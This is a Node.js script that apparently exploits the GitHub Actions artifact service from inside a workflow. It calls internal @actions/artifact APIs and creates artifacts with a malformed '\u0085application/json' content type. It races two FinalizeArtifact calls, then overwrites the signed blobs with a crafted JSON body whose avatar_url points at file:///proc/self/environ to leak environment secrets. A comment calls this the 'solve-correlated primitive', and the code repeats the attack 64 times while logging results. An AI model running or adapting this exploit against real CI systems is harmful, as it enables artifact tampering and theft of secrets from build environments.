import {createHash} from 'node:crypto';

import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const weird = '\u0085application/json';
const repositoryName = process.env.GITHUB_REPOSITORY;

function payload(artifactId) {
  return Buffer.from(JSON.stringify({
    full_name: `${repositoryName}/actions/artifacts/${artifactId}/zip`,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette private artifact',
    stargazers_count: 0,
  }));
}

async function create(name, version, mime) {
  const result = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({value: mime}),
  });
  if (!result.ok || !result.signedUploadUrl) {
    throw new Error(`CreateArtifact v${version} returned no upload URL`);
  }
  return result;
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: weird},
  });
}

async function finalize(name, bytes) {
  const hash = createHash('sha256').update(bytes).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(bytes.length),
    hash: StringValue.create({value: `sha256:${hash}`}),
  });
  if (!result.ok || !result.artifactId) {
    throw new Error('FinalizeArtifact returned no artifact ID');
  }
  return String(result.artifactId);
}

const results = [];
for (let index = 0; index < 64; index++) {
  const name = `cassette-live-${index}-${Date.now()}`;
  const reverse = index % 2 === 1;
  const specs = reverse
    ? [[7, 'application/json'], [6, weird]]
    : [[6, weird], [7, 'application/json']];
  try {
    const created = await Promise.all(specs.map(([version, mime]) =>
      create(name, version, mime)));
    const placeholder = Buffer.from('{"probe":"placeholder"}');
    await Promise.all(created.map(item => upload(item.signedUploadUrl, placeholder)));
    // Match the solve-correlated primitive exactly: race two finalizations and
    // do not inspect the REST artifact before replacing the signed blobs.
    const finalized = await Promise.allSettled([
      finalize(name, placeholder),
      finalize(name, placeholder),
    ]);
    const artifactIds = [...new Set(finalized
      .filter(result => result.status === 'fulfilled')
      .map(result => result.value))];
    if (!artifactIds.length) throw new Error('Both FinalizeArtifact calls failed');

    for (const artifactId of artifactIds) {
      const body = payload(artifactId);
      await Promise.all(created.map(item => upload(item.signedUploadUrl, body)));
    }
    const artifactId = artifactIds.at(-1);
    const body = payload(artifactId);
    const result = {index, name, artifactId, artifactIds, reverse,
      bodySha256: createHash('sha256').update(body).digest('hex')};
    results.push(result);
    console.log('LIVE_RACE_ITEM', JSON.stringify(result));
  } catch (error) {
    console.log('LIVE_RACE_SKIP', index, String(error).slice(0, 240));
  }
}
console.log('LIVE_RACE_MANIFEST', JSON.stringify(results));
